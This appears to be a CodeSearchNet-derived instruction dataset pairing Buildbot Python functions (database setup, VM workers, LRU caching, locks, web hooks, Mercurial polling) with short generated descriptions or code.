{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsetting up the connection to the database.", "response": "def set_up(self, u, engine):\n        \"\"\"Special setup for mysql engines\"\"\"\n        # add the reconnecting PoolListener that will detect a\n        # disconnected connection and automatically start a new\n        # one.  This provides a measure of additional safety over\n        # the pool_recycle parameter, and is useful when e.g., the\n        # mysql server goes away\n        def checkout_listener(dbapi_con, con_record, con_proxy):\n            try:\n                cursor = dbapi_con.cursor()\n                cursor.execute(\"SELECT 1\")\n            except dbapi_con.OperationalError as ex:\n                if self.is_disconnect(ex.args):\n                    # sqlalchemy will re-create the connection\n                    log.msg('connection will be removed')\n                    raise sa.exc.DisconnectionError()\n                log.msg('exception happened {}'.format(ex))\n                raise\n\n        # older versions of sqlalchemy require the listener to be specified\n        # in the kwargs, in a class instance\n        if sautils.sa_version() < (0, 7, 0):\n            class ReconnectingListener:\n                pass\n            rcl = ReconnectingListener()\n            rcl.checkout = checkout_listener\n            engine.pool.add_listener(rcl)\n        else:\n            sa.event.listen(engine.pool, 'checkout', checkout_listener)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef special_case_mysql(self, u, kwargs):\n\n        kwargs['pool_recycle'] = int(u.query.pop('max_idle', 3600))\n\n        # default to the MyISAM storage engine\n        storage_engine = u.query.pop('storage_engine', 'MyISAM')\n        kwargs['connect_args'] = {\n            'init_command': 'SET default_storage_engine=%s' % storage_engine,\n        }\n\n        if 'use_unicode' in u.query:\n            if u.query['use_unicode'] != \"True\":\n                raise TypeError(\"Buildbot requires use_unicode=True \" +\n                                \"(and adds it automatically)\")\n        else:\n            u.query['use_unicode'] = True\n\n        if 'charset' in u.query:\n            if u.query['charset'] != \"utf8\":\n                raise TypeError(\"Buildbot requires charset=utf8 \" +\n                                \"(and adds it automatically)\")\n        else:\n            u.query['charset'] = 'utf8'\n\n        return u, kwargs, None", "response": "For mysql we need to set max_idle and storage_engine to MyISAM storage engine and use it to set use_unicode and charset to be True and utf8."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconstructing a novaclient from the given args.", "response": "def _constructClient(client_version, username, user_domain, password, project_name, project_domain,\n                         auth_url):\n        \"\"\"Return a novaclient from the given args.\"\"\"\n        loader = loading.get_plugin_loader('password')\n\n        # These only work with v3\n        if user_domain is not None or project_domain is not None:\n            auth = loader.load_from_options(auth_url=auth_url, username=username, user_domain_name=user_domain,\n                                            password=password, project_name=project_name, project_domain_name=project_domain)\n        else:\n            auth = loader.load_from_options(auth_url=auth_url, username=username,\n                                            password=password, project_name=project_name)\n\n        sess = session.Session(auth=auth)\n        return client.Client(client_version, session=sess)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nparsing a higher - level view of the block device mapping into something we can use to create a new novaclient.", "response": "def _parseBlockDevice(self, block_device):\n        \"\"\"\n        Parse a higher-level view of the block device mapping into something\n        novaclient wants. This should be similar to how Horizon presents it.\n        Required keys:\n            device_name: The name of the device; e.g. vda or xda.\n            source_type: image, snapshot, volume, or blank/None.\n            destination_type: Destination of block device: volume or local.\n            delete_on_termination: True/False.\n            uuid: The image, snapshot, or volume id.\n            boot_index: Integer used for boot order.\n            volume_size: Size of the device in GiB.\n        \"\"\"\n        client_block_device = {}\n        client_block_device['device_name'] = block_device.get(\n            'device_name', 'vda')\n        client_block_device['source_type'] = block_device.get(\n            'source_type', 'image')\n        client_block_device['destination_type'] = block_device.get(\n            'destination_type', 'volume')\n        client_block_device['delete_on_termination'] = bool(\n            block_device.get('delete_on_termination', True))\n        client_block_device['uuid'] = block_device['uuid']\n        client_block_device['boot_index'] = int(\n            block_device.get('boot_index', 0))\n        # Allow None here. It will be rendered later.\n        client_block_device['volume_size'] = block_device.get('volume_size')\n        return client_block_device"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _renderBlockDevice(self, block_device, build):\n        rendered_block_device = yield build.render(block_device)\n        if rendered_block_device['volume_size'] is None:\n            source_type = rendered_block_device['source_type']\n            source_uuid = rendered_block_device['uuid']\n            volume_size = self._determineVolumeSize(source_type, source_uuid)\n            rendered_block_device['volume_size'] = volume_size\n        return rendered_block_device", "response": "Render all of the block device s values."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ndetermining the minimum size of the volume for the source.", "response": "def _determineVolumeSize(self, source_type, source_uuid):\n        \"\"\"\n        Determine the minimum size the volume needs to be for the source.\n        Returns the size in GiB.\n        \"\"\"\n        nova = self.novaclient\n        if source_type == 'image':\n            # The size returned for an image is in bytes. Round up to the next\n            # integer GiB.\n            image = nova.images.get(source_uuid)\n            if hasattr(image, 'OS-EXT-IMG-SIZE:size'):\n                size = getattr(image, 'OS-EXT-IMG-SIZE:size')\n                size_gb = int(math.ceil(size / 1024.0**3))\n                return size_gb\n        elif source_type == 'volume':\n            # Volumes are easy because they are already in GiB.\n            volume = nova.volumes.get(source_uuid)\n            return volume.size\n        elif source_type == 'snapshot':\n            snap = nova.volume_snapshots.get(source_uuid)\n            return snap.size\n        else:\n            unknown_source = (\"The source type '%s' for UUID '%s' is\"\n                              \" unknown\" % (source_type, source_uuid))\n            raise ValueError(unknown_source)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nruns a database transaction with dbpool. runInteraction but retry the transaction if an exception is raised.", "response": "def runInteractionWithRetry(self, actionFn, *args, **kw):\n        \"\"\"\n        Run a database transaction with dbpool.runInteraction, but retry the\n        transaction in case of a temporary error (like connection lost).\n\n        This is needed to be robust against things like database connection\n        idle timeouts.\n\n        The passed callable that implements the transaction must be retryable,\n        ie. it must not have any destructive side effects in the case where\n        an exception is thrown and/or rollback occurs that would prevent it\n        from functioning correctly when called again.\"\"\"\n\n        def runWithRetry(txn, *args, **kw):\n            retryCount = 0\n            while(True):\n                try:\n                    return actionFn(txn, *args, **kw)\n                except txn.OperationalError:\n                    retryCount += 1\n                    if retryCount >= 5:\n                        raise\n                    excType, excValue, excTraceback = sys.exc_info()\n                    log.msg(\"Database transaction failed (caught exception %s(%s)), retrying ...\" % (\n                        excType, excValue))\n                    txn.close()\n                    txn.reconnect()\n                    txn.reopen()\n\n        return self.dbpool.runInteraction(runWithRetry, *args, **kw)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef runQueryWithRetry(self, *args, **kw):\n\n        def runQuery(txn, *args, **kw):\n            txn.execute(*args, **kw)\n            return txn.fetchall()\n\n        return self.runInteractionWithRetry(runQuery, *args, **kw)", "response": "Run a database query but retry the query if it fails."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef timed_do_fn(f):\n    def wrap(callable, *args, **kwargs):\n        global _debug_id\n\n        # get a description of the function that called us\n        st = traceback.extract_stack(limit=2)\n        file, line, name, _ = st[0]\n\n        # and its locals\n        frame = inspect.currentframe()\n        locals = frame.f_locals\n\n        # invent a unique ID for the description\n        id, _debug_id = _debug_id, _debug_id + 1\n\n        descr = \"%s-%08x\" % (name, id)\n\n        start_time = time.time()\n        log.msg(\"%s - before ('%s' line %d)\" % (descr, file, line))\n        for name in locals:\n            if name in ('self', 'thd'):\n                continue\n            log.msg(\"%s -   %s = %r\" % (descr, name, locals[name]))\n\n        # wrap the callable to log the begin and end of the actual thread\n        # function\n        def callable_wrap(*args, **kargs):\n            log.msg(\"%s - thd start\" % (descr,))\n            try:\n                return callable(*args, **kwargs)\n            finally:\n                log.msg(\"%s - thd end\" % (descr,))\n        d = f(callable_wrap, *args, **kwargs)\n\n        @d.addBoth\n        def after(x):\n            end_time = time.time()\n            elapsed = (end_time - start_time) * 1000\n            log.msg(\"%s - after (%0.2f ms elapsed)\" % (descr, elapsed))\n            return x\n        return d\n    wrap.__name__ = f.__name__\n    wrap.__doc__ = f.__doc__\n    return wrap", "response": "Decorate a function to log before after and elapsed time"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef show(x):\n    print(\"data attributes of %r\" % (x,))\n    names = dir(x)\n    maxlen = max([0] + [len(n) for n in names])\n    for k in names:\n        v = getattr(x, k)\n        if isinstance(v, types.MethodType):\n            continue\n        if k[:2] == '__' and k[-2:] == '__':\n            continue\n        if isinstance(v, str):\n            if len(v) > 80 - maxlen - 5:\n                v = repr(v[:80 - maxlen - 5]) + \"...\"\n        elif isinstance(v, (int, type(None))):\n            v = str(v)\n        elif isinstance(v, (list, tuple, dict)):\n            v = \"%s (%d elements)\" % (v, len(v))\n        else:\n            v = str(type(v))\n        print(\"%*s : %s\" % (maxlen, k, v))\n    return x", "response": "Display the data attributes of an object in a readable format"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef create(self, xml):\n        res = yield queue.executeInThread(self.connection.createXML, xml, 0)\n        return self.DomainClass(self, res)", "response": "I take libvirt XML and start a new VM"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\npreparing base image for start instance.", "response": "def _prepare_base_image(self):\n        \"\"\"\n        I am a private method for creating (possibly cheap) copies of a\n        base_image for start_instance to boot.\n        \"\"\"\n        if not self.base_image:\n            return defer.succeed(True)\n\n        if self.cheap_copy:\n            clone_cmd = \"qemu-img\"\n            clone_args = \"create -b %(base)s -f qcow2 %(image)s\"\n        else:\n            clone_cmd = \"cp\"\n            clone_args = \"%(base)s %(image)s\"\n\n        clone_args = clone_args % {\n            \"base\": self.base_image,\n            \"image\": self.image,\n        }\n\n        log.msg(\"Cloning base image: %s %s'\" % (clone_cmd, clone_args))\n\n        d = utils.getProcessValue(clone_cmd, clone_args.split())\n\n        def _log_result(res):\n            log.msg(\"Cloning exit code was: %d\" % res)\n            return res\n\n        def _log_error(err):\n            log.err(\"Cloning failed: %s\" % err)\n            return err\n\n        d.addCallbacks(_log_result, _log_error)\n\n        return d"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef stop_instance(self, fast=False):\n        log.msg(\"Attempting to stop '%s'\" % self.workername)\n        if self.domain is None:\n            log.msg(\"I don't think that domain is even running, aborting\")\n            return defer.succeed(None)\n\n        domain = self.domain\n        self.domain = None\n\n        if self.graceful_shutdown and not fast:\n            log.msg(\"Graceful shutdown chosen for %s\" % self.workername)\n            d = domain.shutdown()\n        else:\n            d = domain.destroy()\n\n        @d.addCallback\n        def _disconnect(res):\n            log.msg(\"VM destroyed (%s): Forcing its connection closed.\" %\n                    self.workername)\n            return super().disconnect()\n\n        @d.addBoth\n        def _disconnected(res):\n            log.msg(\n                \"We forced disconnection (%s), cleaning up and triggering new build\" % self.workername)\n            if self.base_image:\n                os.remove(self.image)\n            self.botmaster.maybeStartBuildsForWorker(self.workername)\n            return res\n\n        return d", "response": "Stop a running VM."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_simple_split(branchfile):\n\n    index = branchfile.find('/')\n    if index == -1:\n        return None, None\n    branch, file = branchfile.split('/', 1)\n    return branch, file", "response": "Splits the branchfile argument and assuming branch is\n       the first path component in branchfile will return\n       branch and file else None."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef filterBuilderList(self, builderNames):\n\n        # self.builderNames is the configured list of builders\n        # available for try.  If the user supplies a list of builders,\n        # it must be restricted to the configured list.  If not, build\n        # on all of the configured builders.\n        if builderNames:\n            for b in builderNames:\n                if b not in self.builderNames:\n                    log.msg(\"%s got with builder %s\" % (self, b))\n                    log.msg(\" but that wasn't in our list: %s\"\n                            % (self.builderNames,))\n                    return []\n        else:\n            builderNames = self.builderNames\n        return builderNames", "response": "Filter out the builder names that are not in the list of builders."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _ref_key(self, key):\n        queue = self.queue\n        refcount = self.refcount\n\n        queue.append(key)\n        refcount[key] = refcount[key] + 1\n\n        # periodically compact the queue by eliminating duplicate keys\n        # while preserving order of most recent access.  Note that this\n        # is only required when the cache does not exceed its maximum\n        # size\n        if len(queue) > self.max_queue:\n            refcount.clear()\n            queue_appendleft = queue.appendleft\n            queue_appendleft(self.sentinel)\n            for k in filterfalse(refcount.__contains__,\n                                 iter(queue.pop, self.sentinel)):\n                queue_appendleft(k)\n                refcount[k] = 1", "response": "Record a reference to the argument key."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ntries to do a value lookup from the existing cache entries.", "response": "def _get_hit(self, key):\n        \"\"\"Try to do a value lookup from the existing cache entries.\"\"\"\n        try:\n            result = self.cache[key]\n            self.hits += 1\n            self._ref_key(key)\n            return result\n        except KeyError:\n            pass\n\n        result = self.weakrefs[key]\n        self.refhits += 1\n        self.cache[key] = result\n        self._ref_key(key)\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nremove the least recently used entries from the cache.", "response": "def _purge(self):\n        \"\"\"\n        Trim the cache down to max_size by evicting the\n        least-recently-used entries.\n        \"\"\"\n        if len(self.cache) <= self.max_size:\n            return\n\n        cache = self.cache\n        refcount = self.refcount\n        queue = self.queue\n        max_size = self.max_size\n\n        # purge least recently used entries, using refcount to count entries\n        # that appear multiple times in the queue\n        while len(cache) > max_size:\n            refc = 1\n            while refc:\n                k = queue.popleft()\n                refc = refcount[k] = refcount[k] - 1\n            del cache[k]\n            del refcount[k]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef startWorker(basedir, quiet, nodaemon):\n\n    os.chdir(basedir)\n    if quiet or nodaemon:\n        return launch(nodaemon)\n\n    # we probably can't do this os.fork under windows\n    from twisted.python.runtime import platformType\n    if platformType == \"win32\":\n        return launch(nodaemon)\n\n    # fork a child to launch the daemon, while the parent process tails the\n    # logfile\n    if os.fork():\n        # this is the parent\n        rc = Follower().follow()\n        return rc\n    # this is the child: give the logfile-watching parent a chance to start\n    # watching it before we start the daemon\n    time.sleep(0.2)\n    launch(nodaemon)", "response": "Start a worker process."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef textwidth(self, text, config):\n        surface = cairo.SVGSurface(None, 1280, 200)\n        ctx = cairo.Context(surface)\n        ctx.select_font_face(config['font_face'],\n                             cairo.FONT_SLANT_NORMAL,\n                             cairo.FONT_WEIGHT_BOLD)\n        ctx.set_font_size(int(config['font_size']))\n        return ctx.text_extents(text)[2] + 2", "response": "Calculates the width of the specified text."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrendering an SVG from the template", "response": "def makesvg(self, right_text, status=None, left_text=None,\n                left_color=None, config=None):\n        \"\"\"Renders an SVG from the template, using the specified data\n        \"\"\"\n        right_color = config['color_scheme'].get(status, \"#9f9f9f\")  # Grey\n\n        left_text = left_text or config['left_text']\n        left_color = left_color or config['left_color']\n\n        left = {\n            \"color\": left_color,\n            \"text\": left_text,\n            \"width\": self.textwidth(left_text, config)\n        }\n        right = {\n            \"color\": right_color,\n            \"text\": right_text,\n            \"width\": self.textwidth(right_text, config)\n        }\n\n        template = self.env.get_template(config['template_name'].format(**config))\n        return template.render(left=left, right=right, config=config)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_plugins(namespace, interface=None, check_extras=True, load_now=False):\n    return _DB.add_namespace(namespace, interface, check_extras, load_now)", "response": "helper to get a direct interface to _Plugins\n   "}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef add_namespace(self, namespace, interface=None, check_extras=True,\n                      load_now=False):\n        \"\"\"\n        register given namespace in global database of plugins\n\n        in case it's already registered, return the registration\n        \"\"\"\n        tempo = self._namespaces.get(namespace)\n\n        if tempo is None:\n            tempo = _Plugins(namespace, interface, check_extras)\n            self._namespaces[namespace] = tempo\n\n        if load_now:\n            tempo.load()\n\n        return tempo", "response": "Add a namespace to the global database of plugins."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting information about all plugins in registered namespaces", "response": "def info(self):\n        \"\"\"\n        get information about all plugins in registered namespaces\n        \"\"\"\n        result = dict()\n        for name, namespace in self._namespaces.items():\n            result[name] = namespace.info_all()\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nregistering a new PB connection.", "response": "def register(self, portstr, username, password, pfactory):\n        \"\"\"\n        Register a perspective factory PFACTORY to be executed when a PB\n        connection arrives on PORTSTR with USERNAME/PASSWORD.  Returns a\n        Registration object which can be used to unregister later.\n        \"\"\"\n        # do some basic normalization of portstrs\n        if isinstance(portstr, type(0)) or ':' not in portstr:\n            portstr = \"tcp:%s\" % portstr\n\n        reg = Registration(self, portstr, username)\n\n        if portstr not in self.dispatchers:\n            disp = self.dispatchers[portstr] = Dispatcher(portstr)\n            disp.setServiceParent(self)\n        else:\n            disp = self.dispatchers[portstr]\n\n        disp.register(username, password, pfactory)\n\n        return reg"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef getPort(self):\n        disp = self.pbmanager.dispatchers[self.portstr]\n        return disp.port.getHost().port", "response": "Returns the TCP port used for this object."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nstarting shutting down the master.", "response": "def gracefulShutdown(self):\n        \"\"\"Start shutting down\"\"\"\n        if not self.bf.perspective:\n            log.msg(\"No active connection, shutting down NOW\")\n            reactor.stop()\n            return\n\n        log.msg(\n            \"Telling the master we want to shutdown after any running builds are finished\")\n        d = self.bf.perspective.callRemote(\"shutdown\")\n\n        def _shutdownfailed(err):\n            if err.check(AttributeError):\n                log.msg(\n                    \"Master does not support worker initiated shutdown.  Upgrade master to 0.8.3 or later to use this feature.\")\n            else:\n                log.msg('callRemote(\"shutdown\") failed')\n                log.err(err)\n\n        d.addErrback(_shutdownfailed)\n        return d"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _startHungConnectionTimer(self):\n        def hungConnection():\n            self._hung_callback()\n            self._hungConnectionTimer = None\n            self.transport.loseConnection()\n        self._hungConnectionTimer = self._reactor.callLater(\n            self._HUNG_CONNECTION_TIMEOUT, hungConnection)", "response": "Start a timer to detect if the connection is hung."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a boolean indicating whether the lock is available for claiming.", "response": "def isAvailable(self, requester, access):\n        \"\"\" Return a boolean whether the lock is available for claiming \"\"\"\n        debuglog(\"%s isAvailable(%s, %s): self.owners=%r\"\n                 % (self, requester, access, self.owners))\n        num_excl, num_counting = self._claimed_excl, self._claimed_counting\n\n        # Find all waiters ahead of the requester in the wait queue\n        for idx, waiter in enumerate(self.waiting):\n            if waiter[0] is requester:\n                w_index = idx\n                break\n        else:\n            w_index = len(self.waiting)\n        ahead = self.waiting[:w_index]\n\n        if access.mode == 'counting':\n            # Wants counting access\n            return num_excl == 0 and num_counting + len(ahead) < self.maxCount \\\n                and all([w[1].mode == 'counting' for w in ahead])\n        # else Wants exclusive access\n        return num_excl == 0 and num_counting == 0 and not ahead"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef claim(self, owner, access):\n        debuglog(\"%s claim(%s, %s)\" % (self, owner, access.mode))\n        assert owner is not None\n        assert self.isAvailable(owner, access), \"ask for isAvailable() first\"\n\n        assert isinstance(access, LockAccess)\n        assert access.mode in ['counting', 'exclusive']\n        self.waiting = [w for w in self.waiting if w[0] is not owner]\n        self._addOwner(owner, access)\n\n        debuglog(\" %s is claimed '%s'\" % (self, access.mode))", "response": "Claim the lock (lock must be available)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nwaits until the lock is available.", "response": "def waitUntilMaybeAvailable(self, owner, access):\n        \"\"\"Fire when the lock *might* be available. The caller will need to\n        check with isAvailable() when the deferred fires. This loose form is\n        used to avoid deadlocks. If we were interested in a stronger form,\n        this would be named 'waitUntilAvailable', and the deferred would fire\n        after the lock had been claimed.\n        \"\"\"\n        debuglog(\"%s waitUntilAvailable(%s)\" % (self, owner))\n        assert isinstance(access, LockAccess)\n        if self.isAvailable(owner, access):\n            return defer.succeed(self)\n        d = defer.Deferred()\n\n        # Are we already in the wait queue?\n        w = [i for i, w in enumerate(self.waiting) if w[0] is owner]\n        if w:\n            self.waiting[w[0]] = (owner, access, d)\n        else:\n            self.waiting.append((owner, access, d))\n        return d"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_cache(self, cache_name, miss_fn):\n        try:\n            return self._caches[cache_name]\n        except KeyError:\n            max_size = self.config.get(cache_name, self.DEFAULT_CACHE_SIZE)\n            assert max_size >= 1\n            c = self._caches[cache_name] = lru.AsyncLRUCache(miss_fn, max_size)\n            return c", "response": "Get an object of type LUCache with the given name."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nhandle the POST request and returns a Deferred that fires with the response code and message.", "response": "def render_POST(self, request):\n        \"\"\"\n        Responds to events and starts the build process\n          different implementations can decide on what methods they will accept\n\n        :arguments:\n            request\n                the http request object\n        \"\"\"\n        try:\n            d = self.getAndSubmitChanges(request)\n        except Exception:\n            d = defer.fail()\n\n        def ok(_):\n            request.setResponseCode(202)\n            request.finish()\n\n        def err(why):\n            code = 500\n            if why.check(ValueError):\n                code = 400\n                msg = unicode2bytes(why.getErrorMessage())\n            else:\n                log.err(why, \"adding changes from web hook\")\n                msg = b'Error processing changes.'\n            request.setResponseCode(code, msg)\n            request.write(msg)\n            request.finish()\n\n        d.addCallbacks(ok, err)\n\n        return server.NOT_DONE_YET"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef makeHandler(self, dialect):\n        if dialect not in self.dialects:\n            m = \"The dialect specified, '{}', wasn't whitelisted in change_hook\".format(dialect)\n            log.msg(m)\n            log.msg(\n                \"Note: if dialect is 'base' then it's possible your URL is malformed and we didn't regex it properly\")\n            raise ValueError(m)\n\n        if dialect not in self._dialect_handlers:\n            if dialect not in self._plugins:\n                m = \"The dialect specified, '{}', is not registered as a buildbot.webhook plugin\".format(dialect)\n                log.msg(m)\n                raise ValueError(m)\n            options = self.dialects[dialect]\n            if isinstance(options, dict) and 'custom_class' in options:\n                klass = options['custom_class']\n            else:\n                klass = self._plugins.get(dialect)\n            self._dialect_handlers[dialect] = klass(self.master, self.dialects[dialect])\n\n        return self._dialect_handlers[dialect]", "response": "create and cache the handler object for this dialect"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef getChanges(self, request):\n        uriRE = re.search(r'^/change_hook/?([a-zA-Z0-9_]*)', bytes2unicode(request.uri))\n\n        if not uriRE:\n            log.msg(\"URI doesn't match change_hook regex: %s\" % request.uri)\n            raise ValueError(\n                \"URI doesn't match change_hook regex: %s\" % request.uri)\n\n        changes = []\n        src = None\n\n        # Was there a dialect provided?\n        if uriRE.group(1):\n            dialect = uriRE.group(1)\n        else:\n            dialect = 'base'\n\n        handler = self.makeHandler(dialect)\n        changes, src = yield handler.getChanges(request)\n        return (changes, src)", "response": "Get the changes for the current node and source."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndecodes a dictionary of bytes to unicode strings.", "response": "def decode(data, encoding='utf-8', errors='strict'):\n    \"\"\"We need to convert a dictionary where keys and values\n    are bytes, to unicode strings.  This happens when a\n    Python 2 worker sends a dictionary back to a Python 3 master.\n    \"\"\"\n    data_type = type(data)\n\n    if data_type == bytes:\n        return bytes2unicode(data, encoding, errors)\n    if data_type in (dict, list, tuple):\n        if data_type == dict:\n            data = data.items()\n        return data_type(map(decode, data))\n    return data"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nparse the master argument and return the master host and port.", "response": "def validateMasterArgument(self, master_arg):\n        \"\"\"\n        Parse the <master> argument.\n\n        @param master_arg: the <master> argument to parse\n\n        @return: tuple of master's host and port\n        @raise UsageError: on errors parsing the argument\n        \"\"\"\n        if master_arg[:5] == \"http:\":\n            raise usage.UsageError(\"<master> is not a URL - do not use URL\")\n\n        if \":\" not in master_arg:\n            master = master_arg\n            port = 9989\n        else:\n            master, port = master_arg.split(\":\")\n\n        if not master:\n            raise usage.UsageError(\"invalid <master> argument '{}'\".format(\n                                   master_arg))\n        try:\n            port = int(port)\n        except ValueError:\n            raise usage.UsageError(\"invalid master port '{}', \"\n                                   \"needs to be a number\".format(port))\n\n        return master, port"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsetting a build property in the database.", "response": "def setBuildProperty(self, bid, name, value, source):\n        \"\"\" A kind of create_or_update, that's between one or two queries per\n        call \"\"\"\n        def thd(conn):\n            bp_tbl = self.db.model.build_properties\n            self.checkLength(bp_tbl.c.name, name)\n            self.checkLength(bp_tbl.c.source, source)\n            whereclause = sa.and_(bp_tbl.c.buildid == bid,\n                                  bp_tbl.c.name == name)\n            q = sa.select(\n                [bp_tbl.c.value, bp_tbl.c.source],\n                whereclause=whereclause)\n            prop = conn.execute(q).fetchone()\n            value_js = json.dumps(value)\n            if prop is None:\n                conn.execute(bp_tbl.insert(),\n                             dict(buildid=bid, name=name, value=value_js,\n                                  source=source))\n            elif (prop.value != value_js) or (prop.source != source):\n                conn.execute(bp_tbl.update(whereclause=whereclause),\n                             dict(value=value_js, source=source))\n        yield self.db.pool.do(thd)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a decoder function.", "response": "def _decoderFromString(cfg):\n        \"\"\"\n        Return a decoder function.\n        If cfg is a string such as 'latin-1' or u'latin-1',\n        then we return a new lambda, s.decode().\n        If cfg is already a lambda or function, then we return that.\n        \"\"\"\n        if isinstance(cfg, (bytes, str)):\n            return lambda s: s.decode(cfg, 'replace')\n        return cfg"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _getRevDetails(self, rev):\n        args = ['log', '-r', rev, os.linesep.join((\n            '--template={date|hgdate}',\n            '{author}',\n            \"{files % '{file}\" + os.pathsep + \"'}\",\n            '{desc|strip}'))]\n        # Mercurial fails with status 255 if rev is unknown\n        d = utils.getProcessOutput(self.hgbin, args, path=self._absWorkdir(),\n                                   env=os.environ, errortoo=False)\n\n        @d.addCallback\n        def process(output):\n            # all file names are on one line\n            output = output.decode(self.encoding, \"replace\")\n            date, author, files, comments = output.split(\n                os.linesep, 3)\n\n            if not self.usetimestamps:\n                stamp = None\n            else:\n                try:\n                    stamp = float(date.split()[0])\n                except Exception:\n                    log.msg('hgpoller: caught exception converting output %r '\n                            'to timestamp' % date)\n                    raise\n            return stamp, author.strip(), files.split(os.pathsep)[:-1], comments.strip()\n        return d", "response": "Return a Deferred for the date author files comments of given revision."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _initRepository(self):\n        if self._isRepositoryReady():\n            return defer.succeed(None)\n        log.msg('hgpoller: initializing working dir from %s' % self.repourl)\n        d = utils.getProcessOutputAndValue(self.hgbin,\n                                           ['init', self._absWorkdir()],\n                                           env=os.environ)\n        d.addCallback(self._convertNonZeroToFailure)\n        d.addErrback(self._stopOnFailure)\n        d.addCallback(lambda _: log.msg(\n            \"hgpoller: finished initializing working dir %r\" % self.workdir))\n        return d", "response": "Initialize the workdir as a repository."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsetting the current revision in persistent state.", "response": "def _setCurrentRev(self, rev, branch='default'):\n        \"\"\"Return a deferred to set current revision in persistent state.\"\"\"\n        self.lastRev[branch] = str(rev)\n        return self.setState('lastRev', self.lastRev)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a deferred for branch head revision or None.", "response": "def _getHead(self, branch):\n        \"\"\"Return a deferred for branch head revision or None.\n\n        We'll get an error if there is no head for this branch, which is\n        probably a good thing, since it's probably a misspelling\n        (if really buildbotting a branch that does not have any changeset\n        yet, one shouldn't be surprised to get errors)\n        \"\"\"\n        d = utils.getProcessOutput(self.hgbin,\n                                   ['heads', '-r', branch,\n                                       '--template={rev}' + os.linesep],\n                                   path=self._absWorkdir(), env=os.environ, errortoo=False)\n\n        @d.addErrback\n        def no_head_err(exc):\n            log.err(\"hgpoller: could not find revision %r in repository %r\" % (\n                branch, self.repourl))\n\n        @d.addCallback\n        def results(heads):\n            if not heads:\n                return\n\n            if len(heads.split()) > 1:\n                log.err((\"hgpoller: caught several heads in branch %r \"\n                         \"from repository %r. Staying at previous revision\"\n                         \"You should wait until the situation is normal again \"\n                         \"due to a merge or directly strip if remote repo \"\n                         \"gets stripped later.\") % (branch, self.repourl))\n                return\n\n            # in case of whole reconstruction, are we sure that we'll get the\n            # same node -> rev assignations ?\n            return heads.strip().decode(self.encoding)\n        return d"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _processChanges(self, unused_output):\n        for branch in self.branches + self.bookmarks:\n            rev = yield self._getHead(branch)\n            if rev is None:\n                # Nothing pulled?\n                continue\n            yield self._processBranchChanges(rev, branch)", "response": "Process all changes from the master and record the current revision number."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _convertNonZeroToFailure(self, res):\n        \"utility method to handle the result of getProcessOutputAndValue\"\n        (stdout, stderr, code) = res\n        if code != 0:\n            raise EnvironmentError(\n                'command failed with exit code %d: %s' % (code, stderr))\n        return (stdout, stderr, code)", "response": "utility method to handle the result of getProcessOutputAndValue"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _stopOnFailure(self, f):\n        \"utility method to stop the service when a failure occurs\"\n        if self.running:\n            d = defer.maybeDeferred(self.stopService)\n            d.addErrback(log.err, 'while stopping broken HgPoller service')\n        return f", "response": "utility method to stop the service when a failure occurs"}
